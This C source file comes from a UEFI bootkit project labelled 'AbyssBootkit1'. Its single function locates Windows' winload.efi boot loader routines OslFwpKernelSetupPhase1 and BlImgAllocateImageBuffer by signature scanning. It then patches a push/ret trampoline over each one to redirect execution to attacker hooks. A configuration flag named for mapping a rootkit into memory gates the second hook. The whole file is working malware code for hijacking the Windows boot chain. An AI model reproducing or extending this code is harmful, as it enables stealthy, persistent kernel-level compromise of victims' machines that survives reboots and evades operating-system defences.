// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Functions Patch/Hook Windows OS Manager
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/BaseMemoryLib.h
// Provides copy memory, fill memory, zero memory, and GUID functions. The Base Memory Library provides optimized implementations for common memory-based operations. These functions should be used in place of coding your own loops to do equivalent common functions. This allows optimized library implementations to help increase performance.
#include <Library/BaseMemoryLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Functions00Configuration.h>
#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils03Memory.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils05Pattern.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils06Address.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils07PortableExecutable.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils09Hooks.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils10Signatures.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Hooks/Hooks02WinloadEfi1OslFwpKernelSetupPhase1.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Hooks/Hooks02WinloadEfi2BlImgAllocateImageBuffer.h>



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module1_BootWindows0_Hookings/Structures/Structures01PortableExecutable.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Patch to Windows OS Loader (winload.efi) image.
	@details        This function applies a custom patch to modify the behavior of the Windows OS Loader.


	@param[in]      ImageBase                   A pointer to the base address of the loaded image.
	@param[in]      NtHeaders                   A pointer to the NT headers of the Winload EFI image.


	@retval         EFI_SUCCESS                 The patch was successfully applied.
	@retval         other                       An error occurs during the patching process.
**/
EFI_STATUS
BootWindowsHookings_FunctionsWindowsOSLoader_PatchWinloadEfi(
	IN              VOID*                       ImageBase,
	IN              PEFI_IMAGE_NT_HEADERS       NtHeaders
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	PEFI_IMAGE_SECTION_HEADER CodeSection = NULL, PatternSection = NULL;
	PEFI_IMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHeaders);
	UINT16 MajorVersion = 0, MinorVersion = 0, BuildNumber = 0, Revision = 0;


	// ---------------------------------------------------------------------------------------------------------------------
	// Get version info
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Get version info\r\n");

	Status = BootWindowsHookings_UtilsPortableExecutable_GetVersionPEFile(ImageBase, &MajorVersion, &MinorVersion, &BuildNumber, &Revision, NULL);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - BootWindowsHookings_UtilsPortableExecutable_GetVersionPEFile failed: %r (%llx).\r\n", Status, Status);

		return EFI_NOT_FOUND;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Print info
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Print info Winload.efi v%u.%u.%u.%u\r\n", MajorVersion, MinorVersion, BuildNumber, Revision);


	// ---------------------------------------------------------------------------------------------------------------------
	// Find .text and .rdata sections
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Find .text and .rdata sections\r\n");

	for (UINT16 i = 0; i < NtHeaders->FileHeader.NumberOfSections; ++i)
	{
		CHAR8 SectionName[EFI_IMAGE_SIZEOF_SHORT_NAME + 1];

		// Copies a source buffer to a destination buffer, and returns the destination buffer.
		// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-copymem
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseMemoryLib/CopyMemWrapper.c#L41
		CopyMem(SectionName, Section->Name, EFI_IMAGE_SIZEOF_SHORT_NAME);
		SectionName[EFI_IMAGE_SIZEOF_SHORT_NAME] = '\0';

		// Compares two Null-terminated ASCII strings, and returns the difference between the first mismatched ASCII characters.
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L708
		if (AsciiStrCmp(SectionName, ".text") == 0)
		{
			CodeSection = Section;
		}
		// Compares two Null-terminated ASCII strings, and returns the difference between the first mismatched ASCII characters.
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L708
		else if (AsciiStrCmp(SectionName, ".rdata") == 0)
		{
			PatternSection = Section;
		}

		Section++;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Find OslFwpKernelSetupPhase1 signature
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Find OslFwpKernelSetupPhase1 signature\r\n");

	UINT8* FoundOslFwpKernelSetupPhase1 = NULL;
	Status = BootWindowsHookings_UtilsPattern_FindPattern(Global_BootWindowsHookings_SigOslFwpKernelSetupPhase1, 0xCC, sizeof(Global_BootWindowsHookings_SigOslFwpKernelSetupPhase1), (VOID*)((UINT8*)ImageBase + CodeSection->VirtualAddress),  CodeSection->SizeOfRawData, (VOID**)&FoundOslFwpKernelSetupPhase1);

	// Failed
	if (EFI_ERROR(Status))
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - BootWindowsHookings_UtilsPattern_FindPattern [OslFwpKernelSetupPhase1] failed: %r (%llx).\r\n", Status, Status);

		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Find OslFwpKernelSetupPhase1 start
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Find OslFwpKernelSetupPhase1 start\r\n");

	Global_BootWindowsHookings_UtilsHooks_WinloadEfiOslFwpKernelSetupPhase1OriginalPointer = BootWindowsHookings_UtilsAddress_FindStartAddress(ImageBase, NtHeaders, FoundOslFwpKernelSetupPhase1);

	// Failed
	if (Global_BootWindowsHookings_UtilsHooks_WinloadEfiOslFwpKernelSetupPhase1OriginalPointer == NULL)
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - BootWindowsHookings_UtilsAddress_FindStartAddress [OslFwpKernelSetupPhase1] failed: %r (%llx).\r\n", Status, Status);

		return EFI_NOT_FOUND;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Hook winload.efi!OslFwpKernelSetupPhase1
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Hook winload.efi!OslFwpKernelSetupPhase1\r\n");

	VOID* HookAddressOslFwpKernelSetupPhase1 = (VOID*)&BootWindowsHookings_HooksWinloadEfi_OslFwpKernelSetupPhase1;


	// ---------------------------------------------------------------------------------------------------------------------
	// Raise TPL
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Raise TPL\r\n");

	// Raises a task’s priority level and returns its previous level.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-raisetpl
	EFI_TPL Tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);


	// ---------------------------------------------------------------------------------------------------------------------
	// Copy OslFwpKernelSetupPhase1 bytes
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Copy OslFwpKernelSetupPhase1 bytes\r\n");

	// Copies a source buffer to a destination buffer, and returns the destination buffer.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-copymem
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseMemoryLib/CopyMemWrapper.c#L41
	CopyMem(Global_BootWindowsHookings_UtilsHooks_WinloadEfiOslFwpKernelSetupPhase1BackupBytes, (VOID*)Global_BootWindowsHookings_UtilsHooks_WinloadEfiOslFwpKernelSetupPhase1OriginalPointer, sizeof(Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate));


	// ---------------------------------------------------------------------------------------------------------------------
	// Place faux call (push addr, ret) at the start of the original function to transfer the execution to the hooked function
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Place faux call (push addr, ret) at the start of the original function to transfer the execution to the hooked function\r\n");

	// Place hook template in original address
	BootWindowsHookings_UtilsMemory_CopyMemory((VOID*)Global_BootWindowsHookings_UtilsHooks_WinloadEfiOslFwpKernelSetupPhase1OriginalPointer, Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate, sizeof(Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate));


	// ---------------------------------------------------------------------------------------------------------------------
	// Place HookAddressOslFwpKernelSetupPhase1 in template
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Place HookAddressOslFwpKernelSetupPhase1 in template\r\n");

	BootWindowsHookings_UtilsMemory_CopyMemory((UINT8*)Global_BootWindowsHookings_UtilsHooks_WinloadEfiOslFwpKernelSetupPhase1OriginalPointer + Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplateAddressOffset, (UINTN*)&HookAddressOslFwpKernelSetupPhase1, sizeof(HookAddressOslFwpKernelSetupPhase1));


	// ---------------------------------------------------------------------------------------------------------------------
	// Restore TPL
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Restore TPL\r\n");

	// Restores a task’s priority level to its previous value.
	// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-restoretpl
	gBS->RestoreTPL(Tpl);


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the BootkitBootMapRootkitToMemory field is TRUE
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Check if the BootkitBootMapRootkitToMemory field is TRUE\r\n");

	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemory value: %s\r\n", Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemory);

	// Compares two Null-terminated Unicode strings, and returns the difference between the first mismatched Unicode characters.
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L109
	if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemory, L"TRUE") == 0)
	{

		// -----------------------------------------------------------------------------------------------------------------
		// Find BlImgAllocateImageBuffer signature
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Find BlImgAllocateImageBuffer signature\r\n");

		UINT8* FoundBlImgAllocateImageBuffer = NULL;
		Status = BootWindowsHookings_UtilsPattern_FindPattern(Global_BootWindowsHookings_SigBlImgAllocateImageBuffer, 0xCC, sizeof(Global_BootWindowsHookings_SigBlImgAllocateImageBuffer), (VOID*)((UINT8*)ImageBase + CodeSection->VirtualAddress),  CodeSection->SizeOfRawData, (VOID**)&FoundBlImgAllocateImageBuffer);

		// Failed
		if (EFI_ERROR(Status))
		{
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - BootWindowsHookings_UtilsPattern_FindPattern [BlImgAllocateImageBuffer] failed: %r (%llx).\r\n", Status, Status);

			return Status;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Find BlImgAllocateImageBuffer start
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Find BlImgAllocateImageBuffer start\r\n");

		Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferOriginalPointer = BootWindowsHookings_UtilsAddress_FindStartAddress(ImageBase, NtHeaders, FoundBlImgAllocateImageBuffer);

		// Failed
		if (Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferOriginalPointer == NULL)
		{
			PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - BootWindowsHookings_UtilsAddress_FindStartAddress [BlImgAllocateImageBuffer] failed: %r (%llx).\r\n", Status, Status);

			return EFI_NOT_FOUND;
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Hook winload.efi!BlImgAllocateImageBuffer
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Hook winload.efi!BlImgAllocateImageBuffer\r\n");

		Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferHookAddress = (VOID*)&BootWindowsHookings_HooksWinloadEfi_BlImgAllocateImageBuffer;


		// -----------------------------------------------------------------------------------------------------------------
		// Raise TPL
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Raise TPL\r\n");

		// Raises a task’s priority level and returns its previous level.
		// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-raisetpl
		Tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);


		// -----------------------------------------------------------------------------------------------------------------
		// Copy BlImgAllocateImageBuffer bytes
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Copy BlImgAllocateImageBuffer bytes\r\n");

		// Copies a source buffer to a destination buffer, and returns the destination buffer.
		// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-copymem
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseMemoryLib/CopyMemWrapper.c#L41
		CopyMem(Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferBackupBytes, (VOID*)Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferOriginalPointer, sizeof(Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate));


		// -----------------------------------------------------------------------------------------------------------------
		// Place faux call (push addr, ret) at the start of the original function to transfer the execution to the hooked function
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Place faux call (push addr, ret) at the start of the original function to transfer the execution to the hooked function\r\n");

		// Place hook template in original address
		BootWindowsHookings_UtilsMemory_CopyMemory((VOID*)Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferOriginalPointer, Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate, sizeof(Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplate));


		// -----------------------------------------------------------------------------------------------------------------
		// Place Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferHookAddress in template
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Place Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferHookAddress in template\r\n");

		BootWindowsHookings_UtilsMemory_CopyMemory((UINT8*)Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferOriginalPointer + Global_BootWindowsHookings_UtilsHooks_FauxCallHookTemplateAddressOffset, (UINTN*)&Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferHookAddress, sizeof(Global_BootWindowsHookings_UtilsHooks_WinloadEfiBlImgAllocateImageBufferHookAddress));


		// -----------------------------------------------------------------------------------------------------------------
		// Restore TPL
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Restore TPL\r\n");

		// Restores a task’s priority level to its previous value.
		// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-restoretpl
		gBS->RestoreTPL(Tpl);
	}
	else
	{
		PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) -  StrCmp [Global_PreBootConfiguration_FunctionsConfiguration_BootkitBootMapRootkitToMemory] not TRUE.\r\n");
	}



	// ---------------------------------------------------------------------------------------------------------------------
	// Transition to runtime and its implications
	//PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Transitioning to runtime and its implications (OslFwpKernelSetupPhase1 hook has been established, which means the control has now passed into the Windows kernel setup phase. From this point forward, the program operates in the runtime environment, where boot services are no longer available. Debug logging is now the primary method for monitoring behavior as the system enters the kernel initialization.\r\n");

	Global_BootWindowsHookings_UtilsDebug_BootFinishesRuntimeStarts = TRUE;


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	PreBootConfiguration_UtilsDebug_DebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsOSLoader.c] (PatchWinloadEfi) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
